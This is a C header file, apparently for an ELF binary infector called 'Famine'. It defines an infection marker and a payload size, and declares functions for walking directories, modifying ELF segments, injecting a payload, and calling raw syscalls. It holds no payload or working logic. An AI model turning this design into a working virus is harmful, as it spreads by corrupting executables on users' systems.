#ifndef FAMINE_H
#define FAMINE_H

////////////////////////////////////////////////////////////////////////////////
/// INCLUDES 
////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <sys/mman.h>
#include <elf.h>

////////////////////////////////////////////////////////////////////////////////
/// LOGGER 
////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////
/// DEFINES
////////////////////////////////////////////////////////////////////////////////

#define INFECTED_MAGIC_NUMBER 0x15D2
#define ELF_MAGIC_SIZE 4
#define ELF_MAGIC_NUMBER 1179403647
#define X86_64 2

#define PAYLOAD_SIZE 708

#define BUFF_SIZE 1024 * 1024

#define ROOT_SIZE 4
#define USER_SIZE 2

#define CRITERIA_SIZE 4

////////////////////////////////////////////////////////////////////////////////
/// STRUCTURES
////////////////////////////////////////////////////////////////////////////////

struct linux_dirent64
{
	unsigned long long d_ino;
	unsigned long long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

struct directory
{
	char path[PATH_MAX];
	size_t entry;
};

struct s_info
{
	int fd;
	void *ptr;
	unsigned long long size;

	Elf64_Phdr *note;
	Elf64_Phdr *data;

	int addr_padding;
	int offs_padding;
};

struct criteria
{
	bool (*fct)(const Elf64_Ehdr *header);
};


////////////////////////////////////////////////////////////////////////////////
/// PROTOTYPES 
////////////////////////////////////////////////////////////////////////////////

// FAMINE
__attribute__((hot)) void famine(const char *file, const size_t m_entry, const int trace);
void modify_segment(struct s_info *info);
void inject(const struct s_info *info, const size_t m_entry, const int trace);

// INFO
struct s_info get_info(const char *str);
void release_info(struct s_info *info);

// LIB
void Exit(int status);
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int _close(int fd);
int _open(const char *pathname, int flags, long mode);
void *_mmap(void *addr, unsigned long length,  unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset);
int _munmap(void *addr, unsigned long length);
int _getuid(void);
int _stat(const char *pathname, struct stat *statbuf);
int _write(int fd, const void *buf, long count);
size_t _get_random_integer(const size_t range);
size_t _strlen(const char *str);
void _bzero(char *str, const size_t size);
ssize_t _getrandom(void *buf, size_t buflen, unsigned int flags);

// DIRENT_C
__attribute__((hot)) void update_entry(struct directory *dir);
__attribute__((hot)) void update_path(struct directory *dir); 

#endif
